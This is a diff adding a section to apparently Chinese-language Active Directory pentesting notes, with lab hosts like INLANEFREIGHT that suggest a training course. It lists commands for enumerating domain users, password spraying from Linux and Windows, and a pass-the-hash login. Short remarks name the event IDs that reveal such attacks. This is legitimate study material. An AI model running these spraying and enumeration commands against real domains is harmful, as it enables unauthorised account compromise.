@@ -1275,7 +1275,77 @@ import-module .\PowerView.ps1
 Get-DomainPolicy
 ```
 
+### 6.3.2　制作目标用户列表
 
+```
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+或
+
+```
+rpcclient -U "" -N 172.16.5.5
+enumdomusers
+```
+
+或
+
+```
+crackmapexec smb 172.16.5.5 --users
+```
+
+或
+
+```
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+或
+
+```
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+```
+
+或
+
+```
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+```
+
+**Note:**使用 Kerbrute 进行用户名枚举将生成事件 ID [4768：请求了 Kerberos 身份验证票证 （TGT）。](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768) 仅当通过组策略启用 [Kerberos 事件日志记录](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging)时，才会触发此事件。
+
+如果我们无法使用上面突出显示的任何方法创建有效的用户名列表，我们可以返回外部信息收集并搜索公司电子邮件地址，或使用 [linkedin2username](https://github.com/initstring/linkedin2username) 等工具从公司的 LinkedIn 页面混合可能的用户名。
+
+如果有有效凭证
+
+```
+sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+```
+
+**实施Linux的密码喷射攻击：**
+
+```
+for u in $(cat valid_user.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+```
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+```
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123 #验证
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep + #--local-auth 标志将告诉该工具仅尝试在每台计算机上登录一次，从而消除任何帐户锁定的风险。
+```
+
+**实施windows的密码喷射攻击：**
+
+```powershell-session
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+在域控制器的安全日志中，事件 ID [4625 的许多实例：帐户在短时间内无法登录](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)可能表示密码喷射攻击。事件 ID [4771：Kerberos 预身份验证失败 ](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)，这可能表示 LDAP 密码喷射尝试。
 
 
 
